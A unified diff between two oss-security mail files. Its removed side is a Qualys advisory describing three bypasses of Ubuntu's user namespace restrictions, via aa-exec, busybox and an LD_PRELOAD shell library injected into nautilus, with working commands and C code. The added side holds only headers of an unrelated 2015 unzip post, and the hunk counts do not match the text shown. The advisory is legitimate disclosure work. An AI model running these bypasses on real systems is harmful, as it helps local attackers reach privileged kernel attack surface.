@@ -1,4 +1,9 @@
-Received: (qmail 19699 invoked by uid 550); 27 Mar 2025 17:44:31 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["21786" "Monday" "7" "September" "2015" "08:57:20" "-0300" "Gustavo Grieco" "gustavo.grieco@gmail.com" "<CACn5sdRQaUEHfde5QzqnOSv829baMEgDBCN7n8rzzrb+1s2uMw@mail.gmail.com>" "384" "[oss-security] Heap overflow and DoS in unzip 6.0" nil nil nil "9" "2015090711:57:20" "[oss-security] Heap overflow and DoS in unzip 6.0" (number mark "U       gustavo.grie Sep  7  384/21786 " thread-indent "\"[oss-security] Heap overflow and DoS in unzip 6.0\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 21950 invoked by uid 550); 7 Sep 2015 11:57:44 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,426 +12,408 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 19650 invoked from network); 27 Mar 2025 17:44:31 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualys.com; h=
-	content-id:content-transfer-encoding:content-type:date:from
-	:message-id:mime-version:subject:to; s=qualyscom; bh=9/tDdHRuc9e
-	kXmK/5UDWQKoIHuhR62TGJjHvlMAiFCc=; b=3GZXFBea4DQRXMQ+Cb2+/cG3QHU
-	0z2GdVhLkczpTopscijMT0xLvMudf2LfFl3ULWEuk+LiMzqOh+KBBWfU+GIBEZU6
-	GUuA/43c+gdy1cRfgvX1B2dC75zII8FtzIRQD6Pbd/UamhGD8o+V6nR4pdic0oj4
-	DpRYCeKTHhaHlmo2WaB3ZdL15iau87HHJ/YW8MkmW9WHVJEce2S4uoYcrQSmw4ZB
-	MDLgNZ46Er9KR5Ll10O0ioIOM5i9NHun3EcPWiZcBQ4lJzzt+60iBRwBYMz9/aoI
-	UtQmPETZ/9PLarUQMQqhMdkhLfciNfn+SkA08KA2BTBDQj0DdNlRizE4JQg==
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
- b=LkHIF8PA8VK5/ud8BSIltpG3UYyNp1tjOAEOC4LvGFAWUa86AJ9dJPpBRTxCAhZewwV1UP7C3t0ZEZBhlCyn+MQ7iDh+3oLDaYJvOh1dLcIQV8ecJa4Cvh9WNZTk+q0T7ehxUbLealFSnwL1Y1b6WqmCKTx8E9l9t4EAsLr+52uKqQq21zX7M3BGWP4oQoYAXfll9jzwl21R5gBTAOFGxvmRBlZmQZuh/s/HDtQDQutRufSSC9SF7pTjHdAb+egf32cblaml3zhgmzMdXpOPdQyLEvoaQYsAf/lFnLiwlXJJau40iqXbQ/HSkWxqYYZSt5INXk0dIYROGHM7i8onAw==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
- s=arcselector10001;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=9/tDdHRuc9ekXmK/5UDWQKoIHuhR62TGJjHvlMAiFCc=;
- b=u0J/bYRBklg9EiN0/qYk4aXpN/CMcYUijpQsWUJHIgB7mGr8IkUBCOnaXLPM0nW9tK+3mJ+i/lXu21xGxrztXYqJZ0ab18cBQXrIycBh6eara2P4cYr/SLOf+WIpuLWdNG3k4OJSUYTQpv9M7WqXD0Qkj+HGZ7spoPUn3awXEUj3wrCE7z3kA2tODINxGQriR7dTkBSqA/8PJY+TvHK7MMnMKUMeCIT6xxbdC59Tn0zR+42iymddBuln6CZ6HPGSlJcmF9dqECkSQHQuWeF+YuKBMQ+pV0aBikvzGLs/hoxt6YeABXhMHWU+pzw1IkCULTHtJXdcoY4nHs21OIDTDQ==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=qualys.com; dmarc=pass action=none header.from=qualys.com;
- dkim=pass header.d=qualys.com; arc=none
+Received: (qmail 21756 invoked from network); 7 Sep 2015 11:57:32 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=qualys.onmicrosoft.com; s=selector1-qualys-onmicrosoft-com;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=9/tDdHRuc9ekXmK/5UDWQKoIHuhR62TGJjHvlMAiFCc=;
- b=QXV3kj2DL74Uf8VPLGr887hVKBah9HlBn7ph0cB5HUqx5GC4zc4D5dfxtTzXMG0qe6Sj2eCgANoY9Yw3h+tSpEC+7bbQxLmtv2nqgo8hu5W0ZLWCW9SweHEO0NvmdaYFJ+nYxgadpMHuwHqpS6um1qfSHe3A+zaEYwbhBnUnPq8Fjd1CsdJxd3ob3JhwB3mqump3nZPCyqHODt9CDoXIyCJniJa/4KTfGBLxFjnhT/42rvd4zkkt9z10k7ldZpRqCLyWkpkSCCike3y9O5g5c4J7MzwqJktrvPXPZOe0BFyz8EqtKr4YMxbOcDfsBVHez3jMx1L7hW4E5fC+k/5z2Q==
-From: Qualys Security Advisory <qsa@qualys.com>
-To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
-Thread-Topic: Three bypasses of Ubuntu's unprivileged user namespace
- restrictions
-Thread-Index: AQHbnz/bT69u0+SUy02NAI00fE31Lg==
-Date: Thu, 27 Mar 2025 17:44:15 +0000
-Message-ID: <20250327174336.GA24497@localhost.localdomain>
-Accept-Language: en-US
-Content-Language: en-US
-X-MS-Has-Attach:
-X-MS-TNEF-Correlator:
-x-ms-publictraffictype: Email
-x-ms-traffictypediagnostic: SJ0PR06MB6910:EE_|LV8PR06MB10012:EE_
-x-ms-office365-filtering-correlation-id: fbcdc660-610f-4bdc-0375-08dd6d56fe50
-x-ms-exchange-senderadcheck: 1
-x-ms-exchange-antispam-relay: 0
-x-microsoft-antispam: BCL:0;ARA:13230040|1800799024|376014|366016|38070700018;
-x-microsoft-antispam-message-info:
- =?us-ascii?Q?yBmEFWDW3VMDfNo8Ft4l8QfgNNAlQOIwDor72FF2VoCclHvyi+lWctdRZTic?=
- =?us-ascii?Q?5Fbk3yQ1szW9oUBR0B1ns8WdSQlSFP9jOQbaWaweTUSfS6qntdzmhwhBSlNZ?=
- =?us-ascii?Q?kSjqWtObw8mjf+DPqpnkV1ql4BKxGgGkY1UN841sjjFjhBj1Qj9i83Q9cvGy?=
- =?us-ascii?Q?o19tpzDIthQ3r6pxMTv8faSURmAmxUs86zuevDh1TW1jOTo2BY6EI9lMK3yS?=
- =?us-ascii?Q?MhrvOV1ZHlWZ1xGiLtHUCe7sT+T3VeL/aaZ82telUP3aLJw0kJD8bT1F+Xij?=
- =?us-ascii?Q?L8ytVibZfAZAz11IuRAnasl8fNlGGTESLf5WxKoriOkG+sq0fGyT0dgpVbyf?=
- =?us-ascii?Q?2GFbOOwhY5OjIG+ZGP4GItVzVmgnC1ZYo+9F31owsvITQV2yAtHgXswqiTxT?=
- =?us-ascii?Q?dNZJEwe3cmISORmBQCpLZnW6L8bjlrNvv8lPQGZcKnsjUwQR3qCxj2jNc5Ft?=
- =?us-ascii?Q?YBn8jScRh5CaIm4ZFSkdytQY228zWVtRAk6iZ2YyALAmRvSkHc2/pHtXYiSN?=
- =?us-ascii?Q?rBLS3MoXyxS6KlU14Tfe7Wz5quV21A4GP9Awh5/yrsAX6u9PVWEu0ZI1pcE1?=
- =?us-ascii?Q?3xxirnkDG7ajsxcgf3wzlN45C54K4Ghz09nECXgDpaWuyJHZKnOjiqlr6Fa9?=
- =?us-ascii?Q?MmUDYdgewX7uIz6P2ShLFzRJJCvqOaYG8UJlc6BiEykRGKvnXmA5YHgQjoSU?=
- =?us-ascii?Q?H167Vs12MMOQPuSrpyRCzqwZfeiE1i9iMGDDJe+piGmA88SMsqdsvpkd9+1Z?=
- =?us-ascii?Q?59+xyitaiUiK3Br5iX7TaUF8jGOJpshTgJJ9UOesFRA2PeodSyDciLc0eyZ4?=
- =?us-ascii?Q?k+vq1Q5KjrqS1biF8OZQTWRu6YB6l8HMsNJO2slWMK/lGWQSqGClQ9PdsxqJ?=
- =?us-ascii?Q?fnoZmC3XPLKf5ZCJk/xzmievuxU0FbYKZVuNdZGwaIvvhY225C+tt2xUjsrN?=
- =?us-ascii?Q?ypenVNt0+DMJERfxM9QFgx25X+3xh995tUjcLe2JYOBioqEL+pvyJsHncgrt?=
- =?us-ascii?Q?UOEt/0tH+xo9PhMfuU6LszxlDBX8I12lT6Y4E5OpUPpVq2Bq0vfSMTSvBH6w?=
- =?us-ascii?Q?R0yVbkPJ3gO9vSGjbJvGqH1JQYeSk0MhDN3jclo3FFKMSIkIz4bZAJmC14OD?=
- =?us-ascii?Q?uBgpSk3TmmXSkk+DoZ1lGLJDbLf781WONciOtK/jJocMybTpixbKU/oXcPVe?=
- =?us-ascii?Q?KNJDvVnybr9UaUF3KOB7IyOiIuaZA0uwvB4aIVNtvHbD+NkTN+xvRkZd1/E8?=
- =?us-ascii?Q?fwnIfR0bAKLJTXV2QdT2xwqLCxVf4J9aPooDGXEAjvHuBUf1JRAgIx++EnmC?=
- =?us-ascii?Q?TF871fq4GpF9JEMBvouxG3qLqXjnb2HeEgGRpOgNHqoounwSy8vQTl079DIm?=
- =?us-ascii?Q?J5OQC2/qGdn774jgZDIli77YlGir?=
-x-forefront-antispam-report:
- CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:SJ0PR06MB6910.namprd06.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(1800799024)(376014)(366016)(38070700018);DIR:OUT;SFP:1102;
-x-ms-exchange-antispam-messagedata-chunkcount: 1
-x-ms-exchange-antispam-messagedata-0:
- =?us-ascii?Q?PC/RUk2J+4ZlhhNWdxwN4YsPbTH4oYBwXH73v2jd4v9atupW6cv1NFbk/sMn?=
- =?us-ascii?Q?Y/K1KtIPap74a9oakJwt6+JhkI055y2igl9RcC3Nqj+IoezRyPgYdGwST80/?=
- =?us-ascii?Q?AM9TIQIqRSY2QI4HopzMiGS21SyfiY9p3navxU/G00PgCvsNBmxKtVOYdSHF?=
- =?us-ascii?Q?vmEnOET5h14q3Z6ufqEOs0FKBq1q5XE+o+gjevWkayTYOKKjBtzYbyT7fXGq?=
- =?us-ascii?Q?DZH2vOOXkwLfwCzH1b/DKFlJn9UV9Ky9WKiDu2JTnBd60YVrtcwMFUAKcmRl?=
- =?us-ascii?Q?GK8FoIRVT7AqvWL3e0c05cBSIl2ofV6DN47ze/zkDzCPc5lR2vjyusJBkjC5?=
- =?us-ascii?Q?7Xv3MyOrP7NrkUb75mn1zOgzXj45P9A5pPCw/e/F0zF6tx/kv+6ozxDlYs2p?=
- =?us-ascii?Q?3WLurpmbNsdrsiL12NZcy6ewDs21xGu3SRfAdDpYpsfZgmAGDhzRUFwuAU15?=
- =?us-ascii?Q?G2VWXmKWbmSpIBhb1re7CwRkr8Oy4barMHULw8qf17jFUMoWTbBR9obOT+rp?=
- =?us-ascii?Q?//IeVXOCVv8r+WFXe3QiZ3HuJbH4ovExRAF2jA3nDDOa4wiNS4gnz/wuKDDI?=
- =?us-ascii?Q?WeNG01foLRaZesYL6g7HFEyafG9g/HX7L3zsa8l3984naWu3E2cGcnQqh8Bq?=
- =?us-ascii?Q?vaipP6MCSXnlOhwriNgTcqgnuuSfV/jWF9x8OtCQr2I7Q+xzyO9KniqGP+GE?=
- =?us-ascii?Q?I18ICsA2ZIrzMuUDW1BsRUl7a1L69PBX+xBF76oJEq1RYeiyFwkyxGdvCob9?=
- =?us-ascii?Q?7jxt0dDuV9Qxw/FBqeHJt+wK/OAmOcx46QuR3FB6kMeA8rJZppvEHOEO5Wd6?=
- =?us-ascii?Q?J4rv7B8vFGZ0nZ1IJKrl9WzWIT4hBwc+55UxR7zXE0CYsS9b6MOFfWuyapNP?=
- =?us-ascii?Q?F21wBKRnRU9P3HKduevgR3wafPuDSdxaY1vgkUIZL8HpmKOy1MqmuIG92phl?=
- =?us-ascii?Q?0U6V4Mtk14kH6nTbF2bHWOBIPCs/a4U5h+4Kv4yKawJepmganKhdRowxl3XW?=
- =?us-ascii?Q?d6GEiQ5uqEyqSHLChz4MoDeXPXzGJp89zNB7dylNUPoAGrlecQiFUbk7HVMo?=
- =?us-ascii?Q?OR5K6czEr3n2ubORTx0OrkteB2Yndo2eNkOQcCd8LZaSQIPWjIv1LmTfUF4m?=
- =?us-ascii?Q?+3J2E9D/UZ+5a2U6IaAZ5KyMr9Qlch1s7E4uJ7SqLeQs9aJ/JZpShXTyN5Jz?=
- =?us-ascii?Q?5p2WSe461Fqn21GoTrLSrNYndhs16Jge/s1f6TKY+u23Qco+p7T/OL0AnFID?=
- =?us-ascii?Q?NHVJ/N32s+Gk5UN3sONJkhKMEZLNe3y01eyYLBr475dMflexSzlquJ33uxvx?=
- =?us-ascii?Q?GEkskoHgOkqJ/CUbf9Hg/EUYhaniREpHP2w/w3+x4T3BSh7vgCyweglwEFyx?=
- =?us-ascii?Q?EVHFb1fjVukDPCI6VOsslx0HK45MoXtfK7jhDvDi6QAo8hbakBBsiy55wB1W?=
- =?us-ascii?Q?tzoBquA2vcskUSIaJFh+15g9C9BgpHC923f/DZH8ofz2BhoNa6nyM7fAlwOw?=
- =?us-ascii?Q?KM1wPLIG/fIFrXVn8F/LNlTiJoOHWg6FecL7UQk+Pfi1DucEkvFtpNpELfcK?=
- =?us-ascii?Q?e44vmKVLTuUv4E7RXJwYkMwao+k1SeCPDAblwtg9v8Od3RXZxY5dLb662CuL?=
- =?us-ascii?Q?zNWed04eG+gU1beGFPA0gcY=3D?=
-Content-Type: text/plain; charset="us-ascii"
-Content-ID: <1D72CBEC11BA7C48AFAE2B77D6BD8BE3@namprd06.prod.outlook.com>
-Content-Transfer-Encoding: quoted-printable
+        d=gmail.com; s=20120113;
+        h=mime-version:date:message-id:subject:from:to:content-type;
+        bh=AEiHiVjdIngKuAwoYnXHcgv1OQm6O6WOAlFgJUfB+Gg=;
+        b=fWOCGYOzroO1H1nR659KcKhe5LOigIrjVhEKGwgZI+zAGfAPCK4zimcDiHlO/3P5KT
+         TPU4YiipATB5zu2jDjWOi7sDBJsxpJcEHYDZ7lnevIVGq1agplb1JZNK8Xztwt6szZkI
+         CgkTkT+oF7FYk9coyIhEHf2yyi/J01z276lTOsAfZ8uVl0Ib5YBqMwM6YX5WvWYrUOQd
+         K/IXsRzwx0VZGTK0CzE57jKFPNUcg3MJ+lkEWpV6XO17e/rD1K2vJZ7ZlT3t7DukBeRM
+         FPR6mhaevt/N0P566mtNB8PuvzzS3G/+MzXC25IOuGs6lOXw6LKoE7tXzzufq2yGjh3c
+         pKOg==
 MIME-Version: 1.0
-X-OriginatorOrg: qualys.com
-X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-AuthSource: SJ0PR06MB6910.namprd06.prod.outlook.com
-X-MS-Exchange-CrossTenant-Network-Message-Id: fbcdc660-610f-4bdc-0375-08dd6d56fe50
-X-MS-Exchange-CrossTenant-originalarrivaltime: 27 Mar 2025 17:44:15.7382
- (UTC)
-X-MS-Exchange-CrossTenant-fromentityheader: Hosted
-X-MS-Exchange-CrossTenant-id: 81a9ef9a-9a98-4b00-886a-895a603bc029
-X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
-X-MS-Exchange-CrossTenant-userprincipalname: p7g/pyCohl4526eRWvoUPJ2VoBUxoah6Y1l/eJU3jqWztlVLdPa6Q7lFKzdXp9ofzT6S9ms1Et9gAV6SJZ/GrphWjciincv8TfIa0BAaa1w=
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: LV8PR06MB10012
-X-Proofpoint-Virus-Version: vendor=baseguard
- engine=ICAP:2.0.293,Aquarius:18.0.1095,Hydra:6.0.680,FMLib:17.12.68.34
- definitions=2025-03-27_03,2025-03-26_02,2024-11-22_01
-Subject: [oss-security] Three bypasses of Ubuntu's unprivileged user namespace restrictions
-
-
-Qualys Security Advisory
-
-Three bypasses of Ubuntu's unprivileged user namespace restrictions
-
-
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-Contents
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-
-Summary
-Bypass via aa-exec
-Bypass via busybox
-Bypass via LD_PRELOAD
-Acknowledgments
-Timeline (advisory sent to the Ubuntu Security Team on January 15, 2025)
-
-
-------------------------------------------------------------------------
-  Prologue, from https://grsecurity.net/10_years_of_linux_security.pdf:
-
-    + February 2013 (v3.8) - Unprivileged User Namespace support added
-      - Greatly increased kernel attack surface, exposed many interfaces
-        that previously saw little security scrutiny
-
-    + Attack surface exposed by unprivileged user namespaces isn't
-      decreasing anytime soon
-      - Even more functionality being exposed
-------------------------------------------------------------------------
-
-
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-Summary
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-
-Ubuntu 23.10 introduced unprivileged user namespace restrictions (the
-sysctl kernel.apparmor_restrict_unprivileged_userns) and Ubuntu 24.04
-enabled them by default. From Alex Murray's excellent blog post at
-https://ubuntu.com/blog/whats-new-in-security-for-ubuntu-24-04-lts:
-
-  "Unprivileged user namespaces are a widely used feature of the Linux
-  kernel, providing additional security isolation for applications, and
-  are often employed as part of a sandbox environment. However, [...]
-  unprivileged user namespaces also expose additional attack surfaces
-  within the Linux kernel. There has been a long history of (ab)use of
-  unprivileged user namespaces to exploit various kernel
-  vulnerabilities.
-
-  For Ubuntu 24.04 LTS, the use of unprivileged user namespaces is then
-  allowed for all applications but access to any additional permissions
-  within the namespace are denied. This allows more applications to more
-  gracefully handle this default restriction whilst still protecting
-  against the abuse of user namespaces to gain access to additional
-  attack surfaces within the Linux kernel."
-
-Unfortunately, we discovered three different bypasses of these
-unprivileged user namespace restrictions; each bypass allows a local
-attacker to create user namespaces with full administrator capabilities,
-and therefore to still exploit vulnerabilities in kernel components that
-require capabilities such as CAP_SYS_ADMIN or CAP_NET_ADMIN:
-
-- An unprivileged local attacker can simply use the aa-exec tool (which
-  is installed by default on Ubuntu) to transition to one of the many
-  pre-configured AppArmor profiles that do allow the creation of user
-  namespaces with full capabilities (for example, the chrome, flatpak,
-  or trinity profile).
-
-- An unprivileged local attacker can first execute a busybox shell,
-  which is installed by default on Ubuntu, and is one of the programs
-  whose pre-configured AppArmor profile does allow the creation of user
-  namespaces with full capabilities.
-
-- An unprivileged local attacker can LD_PRELOAD a shell into one of the
-  programs whose pre-configured AppArmor profile does allow the creation
-  of user namespaces with full capabilities (for example, nautilus is
-  installed by default on Ubuntu Desktop).
-
-Clarification: such a bypass allows an unprivileged user to obtain full
-capabilities *inside* a namespace, not on the host outside a namespace;
-for comparison, a bypass is not even needed on most Linux distributions,
-because they allow unprivileged users to obtain full capabilities inside
-namespaces by default (and therefore to exploit CAP_SYS_ADMIN kernel
-vulnerabilities for example), without any restriction at all.
-
-For more information on these bypasses and user namespace restrictions,
-please refer to Ubuntu's post at:
-
-  https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-rest=
-riction
-
-
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-Bypass via aa-exec
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-
-    Are we all just algorithms doing what we're supposed to do or can we
-    escape our programming?
-        -- Jude, The Matrix Resurrections
-
-While working on needrestart, particularly on commit e17b564 ("core: fix
-regression of false positives for processes running in chroot or mountns
-(#317)"), we tried to experiment with user and mount namespaces, but to
-our great surprise we were barred from creating them as an unprivileged
-user on Ubuntu 24.04 (although kernel.unprivileged_userns_clone is
-enabled by default):
-
-------------------------------------------------------------------------
-$ id
-uid=3D1001(tiffany) gid=3D1001(tiffany) groups=3D1001(tiffany),100(users)
-
-$ unshare -U -r -m /bin/sh
-unshare: write failed /proc/self/uid_map: Operation not permitted
-------------------------------------------------------------------------
-
-This error message looked very suspicious to us, so we decided to try
-the userns_child_exec tool (from man user_namespaces) instead of the
-pre-installed unshare tool:
-
-------------------------------------------------------------------------
-$ ./userns_child_exec -U -z -m /bin/sh
-
-# id
-uid=3D0(root) gid=3D0(root) groups=3D0(root),65534(nogroup)
-
-# mount --bind /etc/passwd /etc/passwd
-mount: /etc/passwd: bind /etc/passwd failed.
-       dmesg(1) may have more information after failed mount system call.
-------------------------------------------------------------------------
-
-This time we were able to create a user and mount namespace, but to our
-growing surprise we were barred from using any administrator capability
-inside this namespace (our mount command failed). Puzzled, we eventually
-found out that these restrictions were introduced in Ubuntu 23.10, and
-enabled by default in Ubuntu 24.04, to prevent unprivileged local
-attackers from exploiting kernel vulnerabilities that require
-capabilities (CAP_SYS_ADMIN, CAP_NET_ADMIN, etc):
-
-  https://discourse.ubuntu.com/t/spec-unprivileged-user-namespace-restricti=
-ons-via-apparmor-in-ubuntu-23-10
-
-To bypass these restrictions, we immediately tried to run unshare
-through aa-exec, to transition to one of Ubuntu's many AppArmor profiles
-that do allow the creation of user namespaces with full capabilities;
-for example, the trinity profile:
-
-------------------------------------------------------------------------
-$ grep userns /etc/apparmor.d/trinity
-  userns,
-
-$ aa-exec -p trinity -- unshare -U -r -m /bin/sh
-
-# mount --bind /etc/passwd /etc/passwd
-
-# mount
-...
-/dev/sda2 on /etc/passwd type ext4 (rw,relatime)
-------------------------------------------------------------------------
-
-At last, we were able to create a user namespace with full capabilities
-(our mount command succeeded). We later noticed that a quick fix to this
-particular bypass was already mentioned on Ubuntu's excellent security
-podcast in October 2023, but unfortunately it was never enabled by
-default; from https://ubuntusecuritypodcast.org/episode-211/:
-
-  "From a defensive security point of view, also is useful to enable an
-  additional sysctl to ensure that anything which is unconfined can't
-  just abuse these profiles by aa-exec'ing themselves via that profile -
-  so then also need to enable the
-  kernel.apparmor_restrict_unprivileged_unconfined =3D 1 sysctl too"
-
-
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-Bypass via busybox
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-
-    I'm living inside a computer-generated reality that has imprisoned
-    me... again.
-        -- Thomas, The Matrix Resurrections
-
-Let us now suppose that our bypass via aa-exec is fixed (i.e.,
-kernel.apparmor_restrict_unprivileged_unconfined is enabled): can we
-find another way to bypass Ubuntu's unprivileged user namespace
-restrictions?
-
-The only program that is installed by default on both Ubuntu Server and
-Ubuntu Desktop, and whose pre-configured AppArmor profile does allow the
-creation of user namespaces with full capabilities, is busybox.
-
-We therefore simply tried to execute unshare through busybox's built-in
-shell, and lo and behold, we were again able to create a user namespace
-with full capabilities (our mount command succeeded):
-
-------------------------------------------------------------------------
-$ grep userns /etc/apparmor.d/busybox
-  userns,
-
-$ busybox sh
-
-~ $ /usr/bin/unshare -U -r -m /bin/sh
-
-# mount --bind /etc/passwd /etc/passwd
-
-# mount
-...
-/dev/sda2 on /etc/passwd type ext4 (rw,relatime)
-------------------------------------------------------------------------
-
-
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-Bypass via LD_PRELOAD
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-
-    You're going to imprison me after I just got free?
-        -- Neo, The Matrix Resurrections
-
-Let us now suppose that our bypasses via aa-exec and busybox are both
-fixed: can we find another way to bypass Ubuntu's unprivileged user
-namespace restrictions?
-
-Besides busybox, the only other program that is installed by default on
-Ubuntu Desktop, and whose pre-configured AppArmor profile does allow the
-creation of user namespaces with full capabilities, is nautilus.
-
-Although nautilus may or may not provide a shell functionality like
-busybox, we can actually take a more general approach: we can simply
-LD_PRELOAD a small library into nautilus, which then executes a shell.
-And again, we are able to create a user namespace with full capabilities
-(our mount command succeeds):
-
-------------------------------------------------------------------------
-$ grep userns /etc/apparmor.d/nautilus
-  userns,
-
-$ cat > shell.c << "EOF"
-#include <unistd.h>
-static void __attribute__ ((constructor)) _init (void) {
-    static char * const argv[] =3D { "/bin/sh", NULL };
-    static char * const envp[] =3D { NULL };
-    execve(*argv, argv, envp);
-    _exit(__LINE__);
-}
-EOF
-
-$ gcc -fpic -shared -o shell.so shell.c
-
-$ LD_PRELOAD=3D./shell.so /usr/bin/nautilus
-
-$ unshare -U -r -m /bin/sh
-
-# mount --bind /etc/passwd /etc/passwd
-
-# mount
-...
-/dev/sda2 on /etc/passwd type ext4 (rw,relatime)
-------------------------------------------------------------------------
-
-
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-Acknowledgments
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-
-We thank the Ubuntu Security Team for their work on this coordinated
-release.
-
-
